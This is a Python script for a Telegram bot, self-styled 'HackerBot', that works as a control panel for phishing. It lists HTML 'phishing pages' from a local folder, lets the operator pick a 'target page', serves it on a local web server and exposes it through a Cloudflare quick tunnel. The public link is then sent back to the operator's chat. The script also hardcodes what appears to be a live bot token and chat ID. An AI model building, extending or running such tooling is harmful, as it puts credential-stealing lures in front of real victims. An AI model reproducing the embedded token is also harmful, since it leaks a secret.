import telebot
import subprocess
import re
import time
import requests
import os
import shutil
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# Replace with your actual bot token & chat ID
TOKEN = "7256577569:AAHyOFgwSk6hmV1vfhIgW8wub74IW3MTQf4"
CHAT_ID = "6524755764"

print("💀 HackerBot initializing...")

bot = telebot.TeleBot(TOKEN)

PHISHING_DIR = r"C:\Users\RahulB\Desktop\hacktele"

server_process = None
tunnel_process = None
page_map = {}

def send_telegram_message(message, parse_mode=None):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": message}
    if parse_mode:
        data["parse_mode"] = parse_mode
    response = requests.post(url, data=data)
    return response

@bot.message_handler(commands=['start'])
def start(message):
    global page_map
    files = [f for f in os.listdir(PHISHING_DIR) if f.endswith(".html")]
    if not files:
        send_telegram_message("❌ No phishing pages found.")
        return

    markup = InlineKeyboardMarkup()
    page_map = {}

    for i, file in enumerate(files, start=1):
        name = os.path.splitext(file)[0]
        button = InlineKeyboardButton(text=f"💀 {i}. {name}", callback_data=f"page_{i}")
        markup.add(button)
        page_map[str(i)] = file

    bot.send_message(
        CHAT_ID,
        "💀 *HACKER PANEL:*\n🔓 Choose a target page to deploy:",
        reply_markup=markup,
        parse_mode="Markdown"
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith("page_"))
def callback_query(call):
    index = call.data.split("_")[1]
    if index in page_map:
        name = os.path.splitext(page_map[index])[0]
        bot.answer_callback_query(call.id, f"📡 Deploying: {name}")
        serve_page(page_map[index])
    else:
        bot.answer_callback_query(call.id, "❌ Invalid selection.")

@bot.message_handler(commands=['stop'])
def stop(message):
    global server_process, tunnel_process
    send_telegram_message("🛑 Shutting down all modules...")

    if server_process:
        server_process.terminate()
        server_process.wait()
        server_process = None
        send_telegram_message("⚡ Localhost server terminated.")

    if tunnel_process:
        tunnel_process.terminate()
        tunnel_process.wait()
        tunnel_process = None
        send_telegram_message("☁️ Cloudflare tunnel closed.")

def serve_page(page_name):
    global server_process, tunnel_process

    short_name = os.path.splitext(page_name)[0]
    send_telegram_message(f"🕵️ Hosting `{short_name}`...\n⏳ Initializing...", parse_mode="Markdown")

    tmp_dir = os.path.expanduser("~/.phish_temp")

    # Clean & copy entire folder
    if os.path.exists(tmp_dir):
        shutil.rmtree(tmp_dir)
    shutil.copytree(PHISHING_DIR, tmp_dir)

    # Replace index.html with selected file
    selected_page_path = os.path.join(tmp_dir, page_name)
    index_path = os.path.join(tmp_dir, "index.html")
    if os.path.exists(selected_page_path):
        if os.path.exists(index_path):
            os.remove(index_path)
        os.rename(selected_page_path, index_path)
    else:
        send_telegram_message("❌ Selected page not found after copy.")
        return

    # Start local server
    server_process = subprocess.Popen(["python", "-m", "http.server", "8000", "--directory", tmp_dir],
                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    time.sleep(2)

    # Start Cloudflare tunnel
    tunnel_process = subprocess.Popen(["cloudflared", "tunnel", "--url", "http://localhost:8000"],
                                      stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

    tunnel_url = None
    start_time = time.time()

    while time.time() - start_time < 25:
        line = tunnel_process.stdout.readline().strip()
        if not line:
            continue
        match = re.search(r"https://[^\s]+\.trycloudflare\.com", line)
        if match:
            tunnel_url = match.group(0)
            break

    if tunnel_url:
        send_telegram_message(f"🔗 *LIVE LINK:*\n{tunnel_url}", parse_mode="Markdown")
    else:
        send_telegram_message("❌ Failed to retrieve Cloudflare link.")

# Start bot polling
bot.polling(none_stop=True)
